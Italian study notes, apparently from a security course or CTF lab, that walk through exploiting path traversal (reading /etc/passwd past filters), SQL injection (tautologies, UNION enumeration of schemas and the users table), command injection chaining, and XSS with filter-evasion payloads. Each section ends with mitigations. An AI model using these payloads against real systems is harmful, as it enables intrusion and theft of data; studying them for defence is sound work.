2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: path traversal, la quale consente di
navigare liberamente tra file e directory nella macchina in cui è hostata l'applicazione. Sfruttando quindi
sequenze come ../ possiamo navigare per la struttura delle cartelle e leggere qualsiasi file di sistema

	- Provo a navigare per raggiungere il file con "../", ma è filtrato
	Per risolvere provo ad inziare con ./  

	- Provo ad usare cat per stampare il file su standard output, ma è filtrato. 
	Comandi simili possono essere:
	less, more, head, tail, nl , sed '', tac.

	- Provo ad usare ";" per eseguire un altro comando ma è filtrato.
	Per risolvere per uso una pipe |, il cui url encoding è %7C%7C 
	
	- Provo a inserire il payload, ma è filtrato.
	Per mettere uno spazio in ASCII in URL encoding utilizzo %20
	Provo ad usare /etc/passw\\\\d che utilizza l'escape \\\\d per rappresentare un carattere arbitrario.
	Provo ad usare /etc/passw[d] che utilizza i caratteri di gruppo per rappresentare d.
	Provo ad usare /etc/passw? che utilizza il carattere ? per rappresentare un singolo carattere arbitrario.
	
	- La stringa come "passwd" viene sostituita con una stringa vuota. Si può provare a utilizzare tecniche di offuscamento come:
	Doppio Inserimento: Inserisci due volte la stringa, sperando che solo una venga filtrata.
	`passwdpasswd --> passwd` (se il filtro NON è globale)
	Spezzo la Stringa in modo che il filtro NON la rilevi.
	`pass passwd wd --> passpasswdwd --> passwd.`

Le operazioni per limitare una path traversal potrebbero essere:
	- Filtrare più accuratamente i percorsi, assicurandosi efficacemente che non contengano stringhe come ../
	- Avere una whitelist di percorsi noti, anche discrezionati in base all'utente, oppure limitare
	la directory di accesso tramite web


2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: sql injection, la quale 
consentirà di inserire codice SQL malevolo (non sanitizzato) in un campo di input per manipolare 
a nostro piacimento le query al database ed ottenere dati sensibli.
	
SQL INJECTION: base
	- L'idea è sfruttare l'input dell'utente per modificare la query SQL in modo che la condizione risulti sempre vera:
	
	1. Esempio di Query Vulnerabile: `SELECT * FROM users WHERE username = 'user' AND password = 'password'`;
	Se l'input dell'utente per il campo username è: 
	' OR 1=1 --
	oppure 
	' OR '1' = '1

	2.La query diventa: `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'password'`;
	OR 1=1: forza la condizione ad essere sempre vera.
	--: commenta il resto della query, ignorando la verifica della password
	
	3. Se OR è disabilitato, ricorda che è case insensitive (quindi oR, Or, or vanno bene), oppure
	altri operatori booleani come ' AND 1=1 -- , ' || 'a'='a, ' AND NOT 1=0 -- 

	
SQL INJECTION: union based
	- L'idea è di sfruttare l'operatore UNION per combinare il risultato di una query legittima con dati 
	estratti da altre tabelle del database (a tale scopo sono particolarmente rilevanti le tabelle
	che contengono informazioni sulla struttura del database, cone information_schema in mysql)

	1. La prima fase è scoprire il numero di colonne iniettando diverse query con NULL.
	Se dà errore, significa che il numero di colonne specificato non corrisponde a quello 
	atteso dalla query originale. Provo ad iniettare un solo NULL, vedendo l'output cosa restituisce:
	
		-`' UNION SELECT NULL #` oppure `' UNION SELECT NULL --`, dipende dalla versione di sql 
	
	Dà errore, bisogna provare con più colonne.
	
	2. Dopo diversi tentativi scopro che con la seguente query non viene restituito errore:
	
		-`' UNION SELECT NULL, NULL, NULL #`
	
	Da ciò si deduce che il numero di colonne è esattamente 3
	
	3. Inietto le seguenti query per poter rispettivamente:

		- Scoprire gli Schemi: `' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #`
		- Scoprire le Tabelle: `' UNION SELECT NULL, NULL, table_name FROM information_schema.tables #`
		- Scoprire le Tabelle di uno Specifico Schema:`' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #`
		- Scoprire le Colonne di una Specifica Tabella:`' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #`
	
	4. Ne consegue che è possibile recuperare i dati della tabella "users" in questo modo:

		- `' UNION SELECT NULL, NULL, username FROM users #`

Le operazioni per limitare una SQL injection potrebbero essere:
	- Non passare direttamente nelle richieste HTTP i parametri della SQL injection
	- Sanificare gli input, limitarne puù granularmente la lunghezza e il tipo
	- Limitare i privilegi dell'utente DB impedendogli di accedere a dei dati critici

2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: command injection, in quanto l'applicazione web 
accetta input dall'utente e lo utilizza all'interno di un comando di sistema senza convalidandolo adeguatamente. 
Ciò consentirà di iniettare comandi arbitrari sul server.

	1. Il primo passo è quello di riuscire a concatenare comandi. Provo ad usare il ";" che in linux separa due comandi ma è filtrato.

	- Per risolvere uso l'operatore AND (&&) che esegue un comando solo se quello prima dell'operatore ha successo
	- Per risolvere uso l'operatore OR (||) che esegue un comando solo se quello prima dell'operatore fallisce
	- Per risolvere uso la pipe (|) che dà come standard input di un comando lo standard output di quello prima della pipe
	- Per risolvere uso le parentesi tonde "()", che in linux eseguono i comandi in una subshell.
	- Per risolvere uso il comando "&" che esegue il comando in background
	- cat file : Mostra il contenuto del file.

	- Provo ad usare cat per stampare il file su standard output, ma è filtrato. 
	Comandi simili possono essere:
	less, more, head, tail, sed '', tac.
	
	- Provo a inserire il payload, ma è filtrato.
	Per mettere uno spazio in ASCII in URL encoding utilizzo %20

Le operazioni per limitare una command injection potrebbero essere:
	- Evitare system(), exec() e simili: se possibile, non eseguire comandi shell con input dell’utente.
	o quantomeno separare logica da shell usare API native per operazioni

	- Fare escape e sanitizzazione di caratteri più adeguata, rimuovendo caratteri pericolosi (;, |, &, >, ecc.)
	ed eventualmente fare uso di whitelist per accettare solo comandi o argomenti noti

2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: XSS, la quale consente di iniettare codice JavaScript
malevolo in una pagina web che, se non viene correttamente filtrato, verrà eseguito. I tipi principali di XSS sono:

	- Stored XSS: il codice è salvato nel database e viene mostrato a ogni utente che visualizzerà quella entry
	- Reflected XSS: il codice è passato direttamente nell'URL e viene riflesso nella risposta
	- DOM-based XSS: il codice è eseguito nel browser, manipolando direttamente il DOM

Esso, anche se è effettivamente codice eseguito unicamente lato client, rappresenta una minaccia in quanto può consentire 
ad un attaccante di rubare cookie di sessione, eseguire azioni al posto dell’utente, effettuare redirect verso siti malevoli,
e inserire dei form falsi (phishing). Provo a sfruttarla nel seguente modo:

	1. Provo a cambiare il parametro name, ci si accorge che questo viene cambiato anche nella pagina.
	Si potrebbe quindi avere una XSS Reflected. Si prova un payload classico: <script>alert("ciao")</script>

	2. Il sito restituisce "error". Forse è presente qualche meccanismo contro gli XSS o il payload è stato filtrato.
	Provo ad utilizzare le entità HTML per rappresentare < e >: `&#60;script&#62;alert('XSS')&#60;/script&#62`;
	
	- Altri url econding
	`&lt;img src=x onerror=alert(1)&gt;`
	< diventa &lt;
	> diventa &gt;
	" diventa &quot;
	
	`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
	\u003c <
	&#x3c; <
	%3C  (URL encoding)

	3. Provando a utilizzare un semplice <p> funziona, quindi provo ad utilizzare altri tag.
	Potrei usare anche `<a href="javascript:alert(1)">click me</a>` o `<svg onload=alert(1)>`

	4. Il tag "script" è filtrato, provo ad:
	- Inserire caratteri null `(%00):<scrip%00t>alert("XSS")</scrip%00t>`
	- Spezzare la Parola script: `<scripscriptt>alert("XSS")</scripscriptt>`
	
	4. Il tag <img> non è filtrato. Quindi si procede ad utilizzare una classica XSS sfruttando onerror, ovvero :
	`<img src="invalid.jpg" onerror="alert('XSS')">`
	`<body onload="alert('XSS')">`
	`<iframe src="invalid.html" onerror="alert('XSS')">`
	`<input onfocus="alert('XSS')" autofocus>`
	`<div onmouseover="alert('XSS')">Hover over me!</div>`

Le operazioni per limitare una XSS potrebbero essere:
	- Escape i tutti i dati in output dal sito che sono stati inseriti dall'utente. 
	Molti framework lo fanno già automaticamente, magari sarebbe opportuno migrare
	a tecnologie più moderne
	
	- Per evitare XSS reflected, evitare di prendere HTML direttamente dall'input
	o quantomento limitare con più sottigliezza tag e attributi ammessi negli input utente.
	È buona norma anche rimuovere tag o attributi pericolosi.

	- HTTPOnly e Secure cookies permettono di proteggere i cookie dalla lettura 
	via JavaScript. Anche se venisse fatta un XSS (che comunque potrebbe essere 
	sfruttata per fare phishing redirezionando input di form a siti malevoli)
	almeno si impedirebbe a un attaccamnte di esfiltrare dati "direttamente"
